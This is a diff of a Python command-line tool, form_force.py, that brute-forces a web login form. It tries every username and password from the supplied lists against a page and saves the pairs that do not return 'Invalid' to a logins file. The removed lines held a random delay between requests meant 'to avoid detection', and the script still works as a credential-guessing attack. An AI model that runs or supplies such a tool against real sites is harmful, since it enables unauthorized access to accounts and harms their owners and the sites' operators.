@@ -3,7 +3,7 @@
 Brute force a web form.
 
 
-usage: form_force.py [-h] [-u USERNAME] [-p PASSWORD] [-o OUTPUT] [-v] [-uf USERNAME_FIELD] [-pf PASSWORD_FIELD] [--min-delay MIN_DELAY] [--max-delay MAX_DELAY] host page 
+usage: form_force.py [-h] [-u USERNAME] [-p PASSWORD] [-o OUTPUT] [-v] [-uf USERNAME_FIELD] [-pf PASSWORD_FIELD] host page
 
 positional arguments:
   host                  URL or IP address of the host
@@ -22,8 +22,6 @@ options:
                         Username field name
   -pf PASSWORD_FIELD, --password-field PASSWORD_FIELD
                         Password field name
-  --min-delay MIN_DELAY Minimum delay between requests in seconds
-  --max-delay MAX_DELAY Maximum delay between requests in seconds
 
 
 TODO Improvements:
@@ -35,12 +33,12 @@ import argparse
 import logging
 from pathlib import Path
 import requests
-import random  # for random delay
-import time    # for sleep
+
 
 HEADERS = {}
 
-def brute_force_form(host, page, unames, pwords, out, uname_field, pword_field, min_delay, max_delay):
+
+def brute_force_form(host, page, unames, pwords, out, uname_field, pword_field):
     """ """
     if not page.startswith("/"):
         page = f"/{page}"
@@ -67,14 +65,9 @@ def brute_force_form(host, page, unames, pwords, out, uname_field, pword_field, 
             if "Invalid" not in response.text:
                 out.write(f"{uname}:{pword}\n")
                 logging.debug(f"Valid credentials found: {uname}:{pword}")
-
-            # Add a random sleep interval between requests
-            delay = random.uniform(min_delay, max_delay)
-            logging.debug(f"Sleeping for {delay:.2f} seconds to avoid detection")
-            time.sleep(delay)
-
         cnt += 1
         logging.info(f"Attempted {cnt} usernames")
+
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Brute force a web form")
@@ -84,10 +77,12 @@ if __name__ == "__main__":
     parser.add_argument("-p", "--password", type=str, help="Password or file of passwords")
     parser.add_argument("-o", "--output", type=str, help="Output file", default="logins.txt")
     parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
-    parser.add_argument("-uf", "--username-field", type=str, help="Username field name", default="uid")
-    parser.add_argument("-pf", "--password-field", type=str, help="Password field name", default="password")
-    parser.add_argument("--min-delay", type=float, default=0.5, help="Minimum delay between requests in seconds")
-    parser.add_argument("--max-delay", type=float, default=3.0, help="Maximum delay between requests in seconds")
+    parser.add_argument(
+        "-uf", "--username-field", type=str, help="Username field name", default="uid"
+    )
+    parser.add_argument(
+        "-pf", "--password-field", type=str, help="Password field name", default="password"
+    )
     args = parser.parse_args()
 
     if args.verbose:
@@ -97,14 +92,14 @@ if __name__ == "__main__":
 
     if Path(args.username).is_file():
         logging.info(f"Using usernames from file {args.username}")
-        with open(args.username, "r", encoding='utf-8') as f:
+        with open(args.username, "r", encoding='latin-1') as f:
             unames = f.readlines()
     else:
         unames = [args.username]
 
     if Path(args.password).is_file():
         logging.info(f"Using passwords from file {args.password}")
-        with open(args.password, "r", encoding='utf-8') as f:
+        with open(args.password, "r", encoding='latin-1') as f:
             pwords = f.readlines()
     else:
         pwords = [args.password]
@@ -112,6 +107,5 @@ if __name__ == "__main__":
     with open(args.output, "w") as out:
         logging.info(f"Writing valid credentials to {args.output}")
         brute_force_form(
-            args.host, args.page, unames, pwords, out, args.username_field, args.password_field,
-            args.min_delay, args.max_delay
+            args.host, args.page, unames, pwords, out, args.username_field, args.password_field
         )
